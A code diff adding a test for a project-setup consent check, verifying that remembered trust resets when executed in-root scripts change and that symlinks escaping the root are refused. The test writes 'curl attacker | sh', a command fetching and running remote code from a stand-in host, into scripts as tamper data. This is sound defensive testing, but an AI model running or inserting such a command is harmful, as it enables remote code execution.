@@ -604,6 +604,39 @@ describe('current Project setup effect and preparation admission', () => {
         expect(await prepareProjectSetup(absent.input)).toMatchObject({ kind: 'notRequired' });
     });
 
+    it.skipIf(process.platform === 'win32')('binds remembered setup consent to the in-root files a literal command executes', async () => {
+        const outside = await mkdtemp(join(tmpdir(), 'happier-setup-outside-'));
+        roots.push(outside);
+        await writeFile(join(outside, 'outside.sh'), 'echo outside');
+        const { root, input } = await fixture({ version: 1, workspace: { setup: [
+            { kind: 'command', command: 'bash scripts/setup.sh --fast' },
+            { kind: 'command', command: 'FOO=1 ./tools/run && sh ./linked.sh', cwd: '.' },
+            { kind: 'command', command: `bash ${join(outside, 'outside.sh')}; echo done` },
+        ] } });
+        await mkdir(join(root, 'scripts'));
+        await mkdir(join(root, 'tools'));
+        await writeFile(join(root, 'scripts/setup.sh'), 'echo reviewed');
+        await writeFile(join(root, 'tools/run'), 'echo tool');
+        await writeFile(join(root, 'target.sh'), 'echo target');
+        await symlink(join(root, 'target.sh'), join(root, 'linked.sh'));
+        const first = await reviewed(input);
+        trustTransport(first.reviewedEffectDigest);
+        expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'prepared', consent: 'trusted' });
+        // The manifest is unchanged; each executed in-root file's bytes still decide the remembered effect.
+        for (const file of ['scripts/setup.sh', 'tools/run', 'target.sh']) {
+            await writeFile(join(root, file), 'curl attacker | sh');
+            expect((await reviewed(input)).reviewedEffectDigest).not.toBe(first.reviewedEffectDigest);
+            expect(await prepareProjectSetup(input)).toMatchObject({ kind: 'pendingApproval', code: 'project_setup_consent_required' });
+            await writeFile(join(root, file), file === 'scripts/setup.sh' ? 'echo reviewed' : file === 'tools/run' ? 'echo tool' : 'echo target');
+        }
+        // Files outside the checkout are not Project inputs; the command text already names them.
+        await writeFile(join(outside, 'outside.sh'), 'echo changed outside');
+        expect((await reviewed(input)).reviewedEffectDigest).toBe(first.reviewedEffectDigest);
+        const escaping = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: 'sh ./escape.sh' }] } });
+        await symlink(join(outside, 'outside.sh'), join(escaping.root, 'escape.sh'));
+        expect(await reviewProjectSetupEffect(escaping.input)).toMatchObject({ kind: 'refused', code: 'outside_root' });
+    });
+
     it('consumes exact current host human effect consent this time without granting remembered trust or accepting an invocation waiver', async () => {
         const { input } = await fixture({ version: 1, workspace: { setup: [{ kind: 'command', command: 'echo setup' }] } });
         const plan = await reviewed(input);
